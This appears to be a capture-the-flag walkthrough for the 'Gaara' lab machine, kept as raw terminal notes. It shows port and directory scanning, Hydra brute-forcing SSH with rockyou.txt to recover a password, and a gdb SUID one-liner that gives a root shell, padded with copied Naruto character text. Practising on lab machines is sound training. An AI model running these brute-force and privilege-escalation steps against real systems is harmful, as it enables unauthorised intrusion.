@@ -1,0 +1,214 @@
+└─$ nmap -sV -A 172.16.33.69 -p 22,80
+Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-07-27 14:23 CST
+Nmap scan report for 172.16.33.69
+Host is up (0.031s latency).
+
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
+| ssh-hostkey: 
+|   2048 3e:a3:6f:64:03:33:1e:76:f8:e4:98:fe:be:e9:8e:58 (RSA)
+|   256 6c:0e:b5:00:e7:42:44:48:65:ef:fe:d7:7c:e6:64:d5 (ECDSA)
+|_  256 b7:51:f2:f9:85:57:66:a8:65:54:2e:05:f9:40:d2:f4 (ED25519)
+80/tcp open  http    Apache httpd 2.4.38 ((Debian))
+|_http-title: Gaara
+|_http-server-header: Apache/2.4.38 (Debian)
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 21.16 seconds
+
+
+
+└─$ gobuster  dir -u http://172.16.33.69/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 120 
+===============================================================
+Gobuster v3.6
+by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
+===============================================================
+[+] Url:                     http://172.16.33.69/
+[+] Method:                  GET
+[+] Threads:                 120
+[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
+[+] Negative Status codes:   404
+[+] User Agent:              gobuster/3.6
+[+] Timeout:                 10s
+===============================================================
+Starting gobuster in directory enumeration mode
+===============================================================
+
+/Cryoserver           (Status: 200) [Size: 327]
+[ERROR] Get "http://172.16.33.69/penn1": context deadline exceeded (Client.Timeout exceeded while awaiting headers)
+Progress: 220413 / 220561 (99.93%)[ERROR] Get "http://172.16.33.69/2169414": context deadline exceeded (Client.Timeout exceeded while awaiting headers)
+Progress: 220560 / 220561 (100.00%)[ERROR] Get "http://172.16.33.69/knottPlea": context deadline exceeded (Client.Timeout exceeded while awaiting headers)
+Progress: 220560 / 220561 (100.00%)[ERROR] Get "http://172.16.33.69/t6391": context deadline exceeded (Client.Timeout exceeded while awaiting headers)
+Progress: 220560 / 220561 (100.00%)[ERROR] Get "http://172.16.33.69/t6880": context deadline exceeded (Client.Timeout exceeded while awaiting headers)
+Progress: 220560 / 220561 (100.00%)[ERROR] Get "http://172.16.33.69/t5430": context deadline exceeded (Client.Timeout exceeded while awaiting headers)
+Progress: 220560 / 220561 (100.00%)
+===============================================================
+Finished
+
+
+
+
+
+
+Gaara (æˆ‘æ„›ç¾…) is a fictional character in the Naruto manga and anime series created by Masashi Kishimoto. Originally debuting as an antagonist, Gaara is a shinobi affiliated with Sunagakure and is the son of Sunagakure's leader, the Fourth Kazekage. He was born as a demon's host as part of his father's intention to have a weapon to restore their village. However, a combination of being ostracized by the Sunagakure villagers, his early inability to control the Tailed Beast, and the notion that his deceased mother called him her curse on the village caused Gaara to become a ruthless killer who believes his own purpose is to kill his enemies. Only after meeting Naruto Uzumaki does Gaara earn a change of perspective, as he eventually becomes Sunagakure's Fifth Kazekage (äº”ä»£ç›®é¢¨å½±, Godaime Kazekage) and gains acceptance by his people. Gaara has appeared in several pieces of Naruto media, including two of the featured films in the series, the third original video animation, and several video games.
+Gaara was created a foil to the series' eponymous character, Naruto Uzumaki, as the two were born through similar circumstances, but develop vastly different personalities due to a troubled upbringing. His designs and name underwent major changes in the making of his final one which also was modified in later arcs to give Gaara a design that is easier to draw. In the Japanese version of the series, Gaara is voiced by Akira Ishida while Liam O'Brien voices him in the English dub.
+Numerous anime and manga publications have commented on Gaara's character. Multiple series called Naruto's fight against Gaara the high point of the entire series due to their similarities and Gaara's role in the aftermath as he attempts to redeem himself. Among the Naruto reader base, Gaara has been popular, placing high in several popularity polls and always making it to the top ten characters. Numerous pieces of merchandise have been released in Gaara's likeness, including plush dolls, key chains, and action figures.
+Contents
+Creation and conception
+Early designs for Gaara when he was known as Kumomaru.
+Naruto author Masashi Kishimoto created Gaara as a foil to the series' protagonist, Naruto Uzumaki. Naruto and he have a similar background: he was rejected by his peers and fellow villagers for being the host of One-Tailed beast, Shukaku, a situation that Kishimoto describes as "very much like Naruto's". Gaara's development from this state into a highly withdrawn, sadistic character was intended to induce sympathy for him from readers, as it was contrasted against Naruto's development into a cheerful troublemaker.[3] Additionally, his design was designed to look like the Tanuki since Kishimoto thought that it would make him a good rival for Naruto's Nine-Tailed Demon Fox since several parts from the Shukaku were considered by Kishimoto to be opposite ones from the Demon Fox.
+Gaara's backstory became one of Kishimoto's favorite stories from Part I; Kishimoto had to revise his illustrations in such chapters as he wanted readers to understand more of Gaara's mental state.The character was originally going to be called Kotarou Fuuma, but Kishimoto's editor highly refused to give him that name. As a result, he was given the name Gaara why he felt more suitable to the fact he always uses sand. By 2013, Kishimoto stated he still did not understand why such name was discarded. Nevertheless, he refrained from giving him a complete name like Gaara Yuzawa. Another early name was a younger child named "Kumomaru" but was avoided by Kishimoto. However, after multiple changes, he became Gaara. Due to his importance in the manga as a result of being Naruto's foil, Kishimoto added the kanji for "love" in his head to complement his name (part of Gaara's name can be read as "love").
+Gaara's initial attire, along with the costumes of his siblings, was difficult for Kishimoto to draw on a weekly basis. Because of this, Kishimoto gave the three of them simpler costumes towards the end of Part I; Gaara received an outfit with an upright collar. In addition to being easier to draw, it was used to demonstrate the change in relationship between Gaara and Naruto following their previous fight. Kishimoto cites The Matrix, one of his favorite movies, as an inspiration for Gaara's new costume, and he considers it to be his favorite costume of the three siblings. For Part II, there was a scene where an antagonist Deidara was sitting on Gaara's body. This shot was inspired by Akira, a manga by Katsuhiro Otomo that Kishimoto was a fan of.
+In the Japanese version of Naruto's animated versions Akira Ishida voices Gaara. Liam O'Brien takes his place for the English dub. The Western actor, before being selected to voice Gaara, had already heard about the series' popularity. O'Brien went for an early audition in Los Angeles with hopes of doing Gaara's voice but failed it. However, Brien later went through another audition and got Gaara's role
+Before he was born, Gaara's father, the Fourth Kazekage Rasa, had Chiyo make Gaara into the Jinchuriki for the tailed beast Shukaku the One Tail (ä¸€å°¾ã®å®ˆé¶´, Ichibi no Shukaku, English TV: "Shukaku the Sand Spirit") while he was still in his mother's womb before she died giving birth to him. Though believed at the time to be Shukaku's power in action, Gaara can manipulate sand, which subconsciously protects him. Rasa intended to use Gaara as the village's personal weapon, but Shukaku's bloodlust proved too much for Gaara as he suffered night terrors brought about by the tailed beast's influence. With Gaara's sand adding to his inability to control Shukaku, the boy became feared to the point his father decided to have him assassinated. Gaara has the belief that he could only rely upon himself and Shukaku, after Yashamaru, the only person who he thought loved him tried to kill him, on the order of his father, and that he had to kill others in order to confirm the value of his own existence. He thus became narcissistic, even permanently scarring his left temple with the kanji for "love" (æ„›, ai) for his new drive.
+
+Gaara first appears in the series when he is sent to Konohagakure, an allied ninja village, to take part in the Chunin Exams alongside his older siblings Kankuro and Temari. In truth, he is sent in order to infiltrate Konohagakure in preparation for an invasion by Sunagakure and its ally, Otogakure.[19] There, he and Kankuro and Temari easily pass both the first and second phases. In the third phase, Gaara is set to fight against Rock Lee. Lee is able to pass Gaara's defenses, provoking an enraged Gaara f1MgN9mTf9SNbzRygcU into breaking Lee's arm and leg, claiming victory.[20] Sasuke Uchiha manages to give Gaara the first injury he has ever received, causing Gaara to suffer a mental breakdown and nearly manifest his Tailed-Beast powers. This begins the invasion, with his older siblings carrying him off as he could not participate in his current state of mind. Both Sasuke and Naruto Uzumaki confront him with the latter defeating him. Later, Sunagakure sends Gaara to help in preventing Sasuke from defecting to Otogakure, which became enemy of Sunagakure once learning that Orochimaru murdered Rasa prior to the attack. While he is able to help Lee fight Orochimaru's servant Kimimaro, Gaara is unable to prevent Sasuke from escaping from Konoha. He makes amends with the many characters he had alienated, apologizing to those he hurt and improving his relationship with his family. At the same time, Gaara's fundamental characteristic becomes the desire to protect as many people as he can, as in doing so he believes, like Naruto, he will be able to find true strength. This culminates in his replacing his father as the Fifth Kazekage during Part II of the series.
+In Part II of the series, three years after his mission, Deidara, a member of the criminal organization Akatsuki, is sent to Sunagakure to capture Gaara. Gaara fights Deidara to protect the village, but is defeated. The members of the Akatsuki then kidnap him and extract Shukaku from his body. Gaara dies in the process but an elder from the village named Chiyo sacrifices her own life to revive him.[27] Sometime later, he goes to the Five Kage Summit, where the Akatsuki's leader Tobi, breaks into the meeting and announces the Fourth Great Ninja War to capture the last two Tailed-Beasts. Gaara later joins the new Shinobi Alliance as its field commander to protect Naruto and Killer Bee, using Naruto's philosophy of love and the Akatsuki's philosophy of hatred to unite the army when it nearly imploded from internal conflict. On the second day of the war, Gaara encounters his reanimated father. Rasa reveals the truth to Gaara that his uncle's final action was his doing and that the truth that Gaara's mother always loved him, moving Gaara to tears after learning his mother's will is the force behind his sand. Rasa recognizes his son has surpassed him and entrusts Sunagakure to him after being defeated. Gaara later defeats and seals the revived Second Mizukage and joins the rest of the five Kage to fight the Madara Uchiha who was reanimated by Kabuto, nearly getting killed as a result. Later healed by Tsunade, Gaara departs with the other Kage to site of their side's battle with Tobi. Before watching him be absorbed by the Gedo Statue again, Gaara manages to make his peace with Shukaku while thanking the tailed beast for ensuring that he would meet Naruto.They take him to Minato Namikaze and Gaara holds off Madara before Might Guy takes over prior Naruto being successfully revived. Once the Infinite Tsukiyomi is activated, Gaara is caught in the illusion of being with his entire family and Naruto as his friend before being freed by Naruto and Sasuke. By the series epilogue, having the Hidden Leaf Village's Nara Clan as in-laws through Temari, Gaara remains active as the Kazekage.
+In other media
+
+Gaara has made several appearances outside of the Naruto anime and manga. He is present in the second and sixth Naruto feature films, Naruto the Movie 2: Legend of the Stone of Gelel and Naruto Shippuden the Movie: The Will of Fire. In the former, he protects the Land of Wind from an assault by Haido, the antagonist of the film, and later battles the lightning user Ranke, one of Haido's subordinates, and defeats her, while in the latter, he temporarily becomes enemies of Konohagakure as they are the prime suspect of a pitfall attack on him while he is about to attend a meeting with Tsunade, in reality being done by a missing nin, Hiruko, and briefly battles Naruto, although after the confusion is cleared, he allies himself with them again. Gaara is also present in the third original video animation released in the series, in which he participates in a tournament of various characters from across the series. In Boruto: Naruto the Movie, Gaara has adopted a child named Shinki.Gaara and the other Kage attend the Chunin exam in Konoha before they engage in combat against Momoshiki and Kinshiki in a rescue mission led by Sasuke after Naruto was kidnapped. This role is retitled in the Naruto manga sequel, Boruto: Naruto Next Generations.
+
+Naruto video games commonly feature Gaara, including the Clash of Ninja and Ultimate Ninja series.In some games, he uses his Shukaku form for combat, as well as other moves not seen in the anime or manga. Naruto ShippÅ«den: Gekitou Ninja Taisen EX marks the first appearance of Gaara in his Part II appearance in a video game.
+Gaara also appears in light novels from the series. He makes a cameo in Kakashi's Story alongside the other Kage.In Shikamaru Hiden he joins his sister Temari and Naruto in the search for the missing Shikamaru Nara whom Gaara values due to his close relationship with Temari.In Sakura's Hiden, Gaara assists the Konohagakure ninja upon their news that a man resembling Sasuke Uchiha is planning to attack the village.In Konoha Hiden, Gaara visits Konohagakure to see the wedding of Naruto and Hinata Hyuga.He also appears as the protagonist of Gaara Hiden which follows his works as the Fifth Kazekage while dealing with his sister's wedding with Shikamaru.
+Reception
+Liam O'Brien has received praise for voicing Gaara in English.
+
+Gaara has ranked highly in the popularity polls for the series, continuously placing in the top ten.[46] The last such poll was in 2011, in which Gaara was in 4th place.[47] Several pieces of Gaara merchandise have been released; including key chains, plush dolls and action figures of his Part I and Part II appearance.[48][49][50][51][52][53] AnimeCentral listed him as eighth best villain in anime with comments focused on how flashbacks made him a tragic character and at the same time similar to Naruto Uzumaki.[54] Additionally, his fight against Rock Lee was listed as the second best one in anime for exchanges in moves and its conclusion.[55] In 2014, IGN listed him as the third best Naruto character when the series ended.[56]
+
+Anime and manga publications have mostly praised Gaara's character. IGN noted that Gaara was an "anti-Naruto", possessing a "dark, solemn character" as opposed to Naruto's continuous cheer and excitement.[57] In another review, IGN also called Gaara's background "emotional" and "a tad creepy" due to the disparity between the development of Naruto's and Gaara's personalities.[58] Anime News Network celebrated the "depth and emotion" that Naruto's and Gaara's similarities added to the plot, and commented that "nowhere in the entire series run does Naruto shine brighter than in the peak period of his battle against Gaara".[59] They also complimented Kishimoto's visual presentation of Gaara in the manga, referring to "chilling [glimpses] of Gaara's crazed, exposed face".[60] Mania Entertainment noted that Gaara and Sasuke's first fight shows how the former has a "fragile" psyche despite his violent attitude. His backstory was also praised by Mania Entertainment since it includes "a ton of legitimate emotion" allowing viewers from the series to understand more Gaara's personality.[61] DVD Talk writer Todd Douglass Jr. enjoyed the similarities between Gaara and Naruto as well as the former's state after being defeated by the latter.[62] His return to aid the Konohagakure ninjas to fight has been praised by Holly Ellingwood from Active Anime who was mostly focused on Gaara's change of hearts.[63] Liam O'Brien, Gaara's voice actor in the English dubbed version of the anime, has been praised. IGN noted that he did an "excellent job" of making Gaara sound terrifying to the viewer,[64] and Anime News Network noted him as one of the best voice actors in the series.[59]
+
+Gaara's promotion to leader from Sunagakure in Part II of the series was deemed as the most surprising development in the series by Briana Lawrence from Mania Entertainment.[65] UK Anime Network's Kevin Leathers stated that while in the first part of the series, Gaara was a fearsome villain, in the following one he became "much more three-dimensional."[66] Similarly, Douglass Jr. praised Gaara's development in later episodes from Naruto: Shippuden owing to his relationship's expansion with Naruto.[67] His fight against Deidara has also received positive response, with critics praising the revisit of Gaara's popular moves and the strategy both fighters employed.[66][68] On the other hand, Jason Thompson from Anime News Network noted that, while Gaara had developed ever since his introduction in Part I, it felt wrong that Gaara was accepted as the new Kazekage due to his previous wishes to kill people.[69] During the last episodes of Part II's adaptation, Amy McNulty, also from Anime News Network, enjoyed how Gaara was handled as a comic relief alongside other recurring character. Nevertheless, she found important how Gaara now thought of Naruto as a friend rather than as a hero in contrast to the early story arcs of Part II.
+
+
+Gaara f1MgN9mTf9SNbzRygcU 
+
+#base58 decode,
+gaara:ismyname
+
+#hydra ssh by using gaara
+
+└─$ hydra -l gaara -P rockyou.txt 172.16.33.69 ssh -vV -f
+Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
+
+[ATTEMPT] target 172.16.33.69 - login "gaara" - pass "pamela" - 209 of 14344399 [child 9] (0/0)
+[ATTEMPT] target 172.16.33.69 - login "gaara" - pass "kimberly" - 210 of 14344399 [child 13] (0/0)
+[22][ssh] host: 172.16.33.69   login: gaara   password: iloveyou2
+[STATUS] attack finished for 172.16.33.69 (valid pair found)
+1 of 1 target successfully completed, 1 valid password found
+Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2024-07-27 18:36:03
+
+
+gaara@Gaara:~$ cat flag.txt 
+5451d3eb27acb16c652277d30945ab1e
+                                                              
+
+aara@Gaara:~$ cat Kazekage.txt 
+You can find Kazekage here....
+
+
+
+L3Vzci9sb2NhbC9nYW1lcw==
+gaara@Gaara:~$ echo L3Vzci9sb2NhbC9nYW1lcw== | base64 -d
+/usr/local/games
+
+gaara@Gaara:~$ cat /usr/local/games/.supersecret.txt 
+
+Godaime Kazekage:
+
++++++ +++[- >++++ ++++< ]>+++ +.<++ ++++[ ->+++ +++<] >+.-- ---.< +++++
++++[- >---- ----< ]>--- -.<++ +++++ ++[-> +++++ ++++< ]>+++ +++++ .<+++
+[->-- -<]>- .++++ ++.<+ +++++ +++[- >---- ----- <]>-- --.<+ +++++ +++[-
+>++++ +++++ <]>+. <+++[ ->--- <]>-- --.-- --.<+ ++[-> +++<] >++.. <+++[
+->+++ <]>++ ++.<+ +++++ +++[- >---- ----- <]>-- ----- -.<++ +++++ ++[->
++++++ ++++< ]>+++ .<+++ [->-- -<]>- --.+. +++++ .---. <++++ ++++[ ->---
+----- <]>-- ----- ----. <++++ +++++ [->++ +++++ ++<]> +++++ +++.< +++[-
+>---< ]>-.+ +++++ .<+++ +++++ +[->- ----- ---<] >---- .<+++ +++++ [->++
++++++ +<]>+ ++.<+ ++[-> +++<] >+++. +++++ +.--- ----- -.--- ----- .<+++
++++++ [->-- ----- -<]>- ---.< +++++ +++[- >++++ ++++< ]>+++ +++.+ ++.++
++++.< +++[- >---< ]>-.< +++++ +++[- >---- ----< ]>--- -.<++ +++++ ++[->
++++++ ++++< ]>++. ----. --.-- ----- -.<++ +[->+ ++<]> +++++ +.<++ +[->-
+--<]> ---.+ .++++ +.--- ----. <++++ ++++[ ->--- ----- <]>-- ----- .<+++
++++++ +[->+ +++++ +++<] >+++. <+++[ ->--- <]>-- -.--- ----. <++++ [->++
+++<]> +++.< +++++ ++++[ ->--- ----- -<]>- --.<+ +++++ ++[-> +++++ +++<]
+>++++ +.--- -.<++ ++[-> ++++< ]>++. <+++[ ->--- <]>-. +++.< +++[- >+++<
+]>+++ +.<++ +++++ [->-- ----- <]>-- ----- --.<+ ++++[ ->--- --<]> -----
+-.<++ +++++ [->++ +++++ <]>++ +.<++ +++[- >++++ +<]>+ ++++. +++++ ++.<+
++++++ +++[- >---- ----- <]>-- ----- -.<++ ++++[ ->+++ +++<] >++++ .<+++
+++[-> +++++ <]>.< ++++[ ->+++ +<]>+ .<+++ [->-- -<]>- ----. +.<++ +[->+
+++<]> ++++. <++++ +++++ [->-- ----- --<]> .<
+
+#it seems a Brainfuck/OoK, decode it troubled
+Did you really think you could find something that easily? Try Harder!
+
+gaara@Gaara:/$ find / -user root -type f -perm -u=s 2>/dev/null
+/usr/lib/dbus-1.0/dbus-daemon-launch-helper
+/usr/lib/eject/dmcrypt-get-device
+/usr/lib/openssh/ssh-keysign
+/usr/bin/gdb
+/usr/bin/sudo
+/usr/bin/gimp-2.10
+/usr/bin/chsh
+/usr/bin/chfn
+/usr/bin/gpasswd
+/usr/bin/newgrp
+/usr/bin/su
+/usr/bin/passwd
+/usr/bin/mount
+/usr/bin/umount
+
+#from gtfbins
+Shell
+
+It can be used to break out from restricted environments by spawning an interactive system shell.
+
+    gdb -nx -ex '!sh' -ex quit
+
+
+
+gaara@Gaara:~$ gdb -nx -ex 'python import os; os.execl("/bin/sh", "sh", "-p")' -ex quit
+
+GNU gdb (Debian 8.2.1-2+b3) 8.2.1
+Copyright (C) 2018 Free Software Foundation, Inc.
+License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
+This is free software: you are free to change and redistribute it.
+There is NO WARRANTY, to the extent permitted by law.
+Type "show copying" and "show warranty" for details.
+This GDB was configured as "x86_64-linux-gnu".
+Type "show configuration" for configuration details.
+For bug reporting instructions, please see:
+<http://www.gnu.org/software/gdb/bugs/>.
+Find the GDB manual and other documentation resources online at:
+    <http://www.gnu.org/software/gdb/documentation/>.
+
+For help, type "help".
+Type "apropos word" to search for commands related to "word".
+# whoami
+root
+
+
+# cd /root
+# ls -la
+total 24
+drwx------  3 root root 4096 Dec 13  2020 .
+drwxr-xr-x 18 root root 4096 Dec 13  2020 ..
+lrwxrwxrwx  1 root root    9 Dec 13  2020 .bash_history -> /dev/null
+-rw-r--r--  1 root root  570 Jan 31  2010 .bashrc
+drwxr-xr-x  3 root root 4096 Dec 13  2020 .local
+-rw-r--r--  1 root root  148 Aug 17  2015 .profile
+-rw-r--r--  1 root root  803 Dec 13  2020 root.txt
+# cat root.txt
+
+
+ ██████╗  █████╗  █████╗ ██████╗  █████╗ 
+██╔════╝ ██╔══██╗██╔══██╗██╔══██╗██╔══██╗
+██║  ███╗███████║███████║██████╔╝███████║
+██║   ██║██╔══██║██╔══██║██╔══██╗██╔══██║
+╚██████╔╝██║  ██║██║  ██║██║  ██║██║  ██║
+ ╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝
+
+8a763d61f71db8e7aa237055de928d86
+
+Congrats You have Rooted Gaara.
+
+Give the feedback on Twitter if you Root this : @0xJin
